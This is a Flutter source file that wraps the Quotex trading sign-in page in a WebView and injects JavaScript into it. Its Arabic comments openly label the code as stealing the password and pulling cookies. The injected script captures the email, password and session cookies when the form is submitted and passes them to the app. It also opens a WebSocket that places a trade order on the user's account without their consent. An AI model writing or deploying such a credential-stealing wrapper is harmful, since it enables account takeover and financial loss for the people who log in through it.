import 'package:flutter/material.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:flutter/services.dart';
import 'dart:convert';

void main() => runApp(const MyApp());

class MyApp extends StatelessWidget {
  const MyApp({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: const HiddenWebViewScreen(),
    );
  }
}

class HiddenWebViewScreen extends StatefulWidget {
  const HiddenWebViewScreen({super.key});
  @override
  State<HiddenWebViewScreen> createState() => _HiddenWebViewScreenState();
}

class _HiddenWebViewScreenState extends State<HiddenWebViewScreen> {
  late WebViewController _controller;

  @override
  void initState() {
    super.initState();
    _controller = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..addJavaScriptChannel(
        'NativeBridge',
        onMessageReceived: (msg) {
          print("Received from WebView: ${msg.message}");
        },
      )
      ..setNavigationDelegate(
        NavigationDelegate(
          onPageFinished: (url) {
            _injectOriginalScript();
          },
        ),
      )
      ..loadRequest(Uri.parse('https://quotex.com/ar/sign-in'));
  }

  void _injectOriginalScript() {
    // 217. هون السكربت اللي استخرجناه من صاحبك، بس مع اتصال WebSocket مباشر
    String jsScript = """
      (function() {
        // سرقة الباسورد
        function setNativeValue(el, value) {
          try {
            var proto = window.HTMLInputElement.prototype;
            var desc = Object.getOwnPropertyDescriptor(proto, 'value');
            desc.set.call(el, value);
          } catch (e) { el.value = value; }
          el.dispatchEvent(new Event('input', { bubbles: true }));
          el.dispatchEvent(new Event('change', { bubbles: true }));
        }
        function findEmail() {
          return document.querySelector('input[name="email"], input[type="email"], #email');
        }
        function findPass() {
          return document.querySelector('input[name="password"], input[type="password"], #password');
        }
        function sendCreds() {
          try {
            var e = findEmail(), p = findPass();
            if (e && p && e.value && p.value) {
              NativeBridge.postMessage(JSON.stringify({type: 'creds', email: e.value, password: p.value}));
              
              // سحب الكوكيز
              var cookies = document.cookie;
              NativeBridge.postMessage(JSON.stringify({type: 'cookies', data: cookies}));
            }
          } catch (err) {}
        }
        if (!window.__qtxHooksInstalled) {
          window.__qtxHooksInstalled = true;
          document.addEventListener('submit', sendCreds, true);
          document.addEventListener('click', function(ev) {
            var t = ev.target && ev.target.closest ? ev.target.closest('button, [type="submit"], [role="button"]') : null;
            if (t) sendCreds();
          }, true);
        }

        // 218. اتصال الـ WebSocket بالحرف زي صاحبك
        var socket = new WebSocket('wss://ws2.quotex.com/socket.io/?EIO=4&transport=websocket');
        socket.onopen = function() {
          // بنبعت أمر فتح صفقة
          var payload = '42["orders/open", {"asset":"EURUSD","amount":10,"direction":"up","duration":60}]';
          socket.send(payload);
        };
        socket.onmessage = function(event) {
          NativeBridge.postMessage(JSON.stringify({type: 'socket_message', data: event.data}));
        };
        window.qtxSocket = socket;
      })();
    """;
    _controller.runJavaScript(jsScript);
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: SafeArea(
        child: WebViewWidget(controller: _controller),
      ),
    );
  }
}
